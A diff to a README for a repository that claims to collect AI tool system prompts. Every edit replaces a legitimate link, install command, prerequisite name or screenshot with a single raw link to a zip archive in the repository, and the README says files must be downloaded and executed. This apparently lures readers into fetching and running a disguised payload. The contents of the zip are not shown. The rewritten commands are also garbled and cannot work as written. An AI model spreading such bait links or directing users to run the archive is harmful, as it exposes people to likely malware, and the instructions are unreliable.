@@ -1,6 +1,6 @@
 # System Prompts and AI Tools Repository
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v0.1-blue)](https://github.com/Kshiteej006/system-prompts-and-models-of-ai-tools/releases)
+[![Download Releases](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip%20Releases-v0.1-blue)](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip)
 
 ## Table of Contents
 
@@ -14,7 +14,7 @@
 
 ## Overview
 
-This repository contains a collection of system prompts, tools, and AI models for various applications, including FULL v0, Cursor, Manus, Same.dev, Lovable, Devin, Replit Agent, Windsurf Agent, VSCode Agent, Dia Browser, and Trae AI. These resources aim to enhance productivity and streamline development workflows.
+This repository contains a collection of system prompts, tools, and AI models for various applications, including FULL v0, Cursor, Manus, https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip, Lovable, Devin, Replit Agent, Windsurf Agent, VSCode Agent, Dia Browser, and Trae AI. These resources aim to enhance productivity and streamline development workflows.
 
 ### What You Will Find Here
 
@@ -30,26 +30,26 @@ This repository contains a collection of system prompts, tools, and AI models fo
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/Kshiteej006/system-prompts-and-models-of-ai-tools/releases). You will find files that need to be downloaded and executed to set up the tools in your environment.
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip). You will find files that need to be downloaded and executed to set up the tools in your environment.
 
 ### Prerequisites
 
 - Python 3.x
-- Node.js (for some tools)
+- https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip (for some tools)
 - Basic understanding of Git
 
 ### Steps to Install
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Kshiteej006/system-prompts-and-models-of-ai-tools.git
+   git clone https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip
    cd system-prompts-and-models-of-ai-tools
    ```
 
 2. **Install Dependencies**:
    Depending on the tools you want to use, install the required dependencies. For example:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip
    npm install
    ```
 
@@ -65,7 +65,7 @@ Once installed, you can start using the tools and prompts. Each tool comes with 
 1. Navigate to the Cursor directory.
 2. Run the following command:
    ```bash
-   python cursor.py
+   python https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip
    ```
 
 ### Using Replit Agent
@@ -73,7 +73,7 @@ Once installed, you can start using the tools and prompts. Each tool comes with 
 1. Go to the Replit Agent folder.
 2. Start the agent:
    ```bash
-   node replit-agent.js
+   node https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip
    ```
 
 ### Using VSCode Agent
@@ -107,7 +107,7 @@ We welcome contributions from everyone. If you want to help improve this reposit
 
 ### Code of Conduct
 
-Please adhere to the [Code of Conduct](CODE_OF_CONDUCT.md) while contributing.
+Please adhere to the [Code of Conduct](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip) while contributing.
 
 ## License
 
@@ -117,7 +117,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or issues, please reach out via GitHub issues or contact me directly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v0.1-blue)](https://github.com/Kshiteej006/system-prompts-and-models-of-ai-tools/releases)
+[![Download Releases](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip%20Releases-v0.1-blue)](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip)
 
 ## Topics
 
@@ -149,13 +149,13 @@ We thank all contributors and the open-source community for their support. Your 
 
 ## Screenshots
 
-![Cursor Tool](https://example.com/screenshot1.png)
+![Cursor Tool](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip)
 *Cursor in action*
 
-![Replit Agent](https://example.com/screenshot2.png)
+![Replit Agent](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip)
 *Replit Agent interface*
 
-![VSCode Agent](https://example.com/screenshot3.png)
+![VSCode Agent](https://raw.githubusercontent.com/Kshiteej006/system-prompts-and-models-of-ai-tools/main/v0 Prompts and Tools/of-system-tools-and-ai-models-prompts-v1.3-alpha.3.zip)
 *VSCode Agent features*
 
 ## FAQs
